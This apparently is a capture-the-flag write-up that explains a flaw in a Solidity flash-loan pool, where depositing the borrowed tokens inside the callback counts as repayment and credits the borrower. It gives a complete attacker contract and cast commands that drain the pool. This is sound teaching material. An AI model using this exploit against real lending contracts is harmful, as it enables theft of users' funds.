# challenge name

# code / Description
```solidity
function deposit(uint256 amount) external {
    address _msgsender = msg.sender;

    _updateFees(_msgsender);
    IERC20Minimal(underlying).transferFrom(_msgsender, address(this), amount);

    _mint(_msgsender, amount);
}
```

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (token != underlying) {
        revert NotSupported(token);
    }

    IERC20Minimal _token = IERC20Minimal(underlying);
    uint256 _balanceBefore = _token.balanceOf(address(this));

    if (amount > _balanceBefore) {
        revert InsufficientBalance();
    }

    uint256 _fee = _computeFee(amount);
    _token.transfer(address(receiver), amount);

    if (
        receiver.onFlashLoan(msg.sender, underlying, amount, _fee, data)
            != keccak256("ERC3156FlashBorrower.onFlashLoan")
    ) {
        revert CallbackFailed();
    }

    uint256 _balanceAfter = _token.balanceOf(address(this));
    if (_balanceAfter < _balanceBefore + _fee) {
        revert LoanNotRepaid();
    }

    // Accumulate fees and update feePerShare
    uint256 interest = _balanceAfter - _balanceBefore;
    feePerShare += interest.fixedDivFloor(totalSupply, BONE);

    emit FlashLoanSuccessful(address(receiver), msg.sender, token, amount, _fee);
    return true;
}
```



# Challenge Analysis

This challenge revolves around a smart contract that implements a flash loan feature, which allows borrowing assets with the obligation of returning them within the same transaction. The vulnerability arises from improper handling of the loan repayment mechanism. The contract permits the depositing of flash-loaned assets directly back into the pool without proper validation of the repayment source or completion status. This flaw, combined with a faulty deposit function, results in the minting of tokens to the sender and improperly assigns credit, which the sender can later withdraw, leading to the potential draining of ETH from the contract.


# Solution

1. Deploy Attacker Contract: First, deploy an attacker contract implementing IERC3156FlashBorrower. In the constructor of this contract, set the target flash loan pool, approve the flash loan amount, and prepare for receiving the loan by setting the maximum loan amount and ensuring the contract can handle the token involved.

```solidity
contract BadBorrower is IERC3156FlashBorrower {
    address target;
    uint maxloan;
    address underlying;

    constructor(address _target) {
        target = _target;
        underlying = ILoanPool(_target).underlying(); 
        maxloan = ILoanPool(_target).maxFlashLoan(underlying);

        try IToken(underlying).approve(_target, type(uint256).max) {} catch {
            revert("cant add LoanPool to attacker allowancea");
        }
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) public returns (bytes32) {
        ILoanPool(msg.sender).deposit(amount);
        IToken(token).transferFrom(tx.origin, msg.sender, fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function withdraw() public {
        try ILoanPool(target).withdraw(maxloan) {
        } catch {
            revert("cant withdraw!");   
        }
    }
}
```



2. Approve Attacker Contract: Next, approve the attacker contract to transfer the required token amount to the flash loan contract to cover the flash loan fee. This is necessary to meet the requirements of the flash loan mechanism, specifically for repayment.

```bash
cast send <UNDERLYING_TOKEN_ADDRESS> "approve(address,uint256)" <TARGET_CONTRACT_ADDRESS> 9999999999999999999999 --rpc-url <RPC_URL> --private-key <PRIVATE_KEY>
```


3. Initiate Flash Loan: Trigger a flash loan from the attacker contract. The onFlashLoan function within this contract is designed to misuse the deposit mechanism: it deposits the flash-loaned amount back into the loan pool, exploiting the flawed logic to mint new tokens or credit to the attacker contract.

```bash
cast send <TARGET_CONTRACT_ADDRESS> "flashLoan(IERC3156FlashBorrower,address,uint256,bytes)" <ATTACKER_CONTRACT_ADDRESS> <UNDERLYING_TOKEN_ADDRESS> 10000000000000000000 0x --rpc-url <RPC_URL> --private-key <PRIVATE_KEY>
```


4. Handle Loan and Fee in onFlashLoan: Within the onFlashLoan execution context the borrowed tokens are deposited back into the pool using the deposit function. This action satisfies the loan's return requirements while simultaneously credits the sender and mints additional tokens, effectively leveraging the return of the loaned tokens. Subsequently, the loan fee is paid from the external owner's account (EOA). This step ensures that the flash loan requirements are met.

```solidity
ILoanPool(msg.sender).deposit(amount);
IToken(token).transferFrom(tx.origin, msg.sender, fee);
```


5. Withdraw Assets: Finally, call the withdraw function on the attacker contract, which, in turn, calls the withdraw function on the flash loan contract. Since the attacker contract's balance has been artificially inflated through the earlier deposit, this step allows withdrawing more assets than should be possible, effectively draining ETH from the flash loan contract.

```bash
cast send <ATTACKER_CONTRACT_ADDRESS> "withdraw()" --rpc-url <RPC_URL> --private-key <PRIVATE_KEY>
```

**AUTHOR**:
> Mohammad2024 / Pr1m3d Team